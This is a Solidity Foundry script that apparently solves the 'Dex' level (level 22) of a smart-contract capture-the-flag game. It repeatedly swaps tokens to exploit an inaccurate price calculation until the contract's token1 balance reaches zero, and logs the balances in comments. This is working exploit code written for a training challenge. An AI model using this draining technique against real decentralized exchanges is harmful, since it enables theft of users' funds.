// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Dex } from "../src/level22.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@openzeppelin-contracts/contracts/utils/Strings.sol";

///@notice Inaccurate swap price calculation
contract Level22Solution is Script {
    Dex level = Dex(0x1b607c00B0C2F44E7BFC453544734260673ca59d);
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        /*
        The swap() function does not calculate price accurately, 
        with each swap the user gets more and more token and Dex contract balance becomes lesser.
        */
        level.approve(address(level), 10);
        level.swap(level.token1(), level.token2(), 10);
        console.log("SWAP #1");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));
        
        
        level.approve(address(level), level.balanceOf(level.token2(), vm.envAddress("MY_ADDRESS")));
        level.swap(level.token2(), level.token1(), level.balanceOf(level.token2(), vm.envAddress("MY_ADDRESS")));
        console.log("SWAP #2");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));

        // After the 2nd swap, the Dex contract balance for Token1: 86, Token2: 110, which is 196/200.
        // While the user has 24 Token1 (up from 20 [token1+token2]).
        level.approve(address(level), level.balanceOf(level.token1(), vm.envAddress("MY_ADDRESS")));
        level.swap(level.token1(), level.token2(), level.balanceOf(level.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("SWAP #3");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));


        level.approve(address(level), level.balanceOf(level.token2(), vm.envAddress("MY_ADDRESS")));
        level.swap(level.token2(), level.token1(), level.balanceOf(level.token2(), vm.envAddress("MY_ADDRESS")));
        console.log("SWAP #4");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));


        level.approve(address(level), level.balanceOf(level.token1(), vm.envAddress("MY_ADDRESS")));
        level.swap(level.token1(), level.token2(), level.balanceOf(level.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("SWAP #5");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));

    
        // After swap #5, Dex contract only left a balance of 45 Token2.
        level.approve(address(level), 45);
        level.swap(level.token2(), level.token1(), 45);
        console.log("SWAP #6");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));


        console.log(string(abi.encodePacked("User\nToken1: ",Strings.toString(level.balanceOf(level.token1(), vm.envAddress("MY_ADDRESS"))),
        "\n", "Token2: ", Strings.toString(level.balanceOf(level.token2(), vm.envAddress("MY_ADDRESS"))))));        

        /*
        Dex contract token balance logs
        SWAP #1
        Token1:  110
        Token2:  90

        SWAP #2
        Token1:  86
        Token2:  110

        SWAP #3
        Token1:  110
        Token2:  80

        SWAP #4
        Token1:  69
        Token2:  110

        SWAP #5
        Token1:  110
        Token2:  45

        SWAP #6
        Token1:  0
        Token2:  90
        */
        vm.stopBroadcast();
    }
}
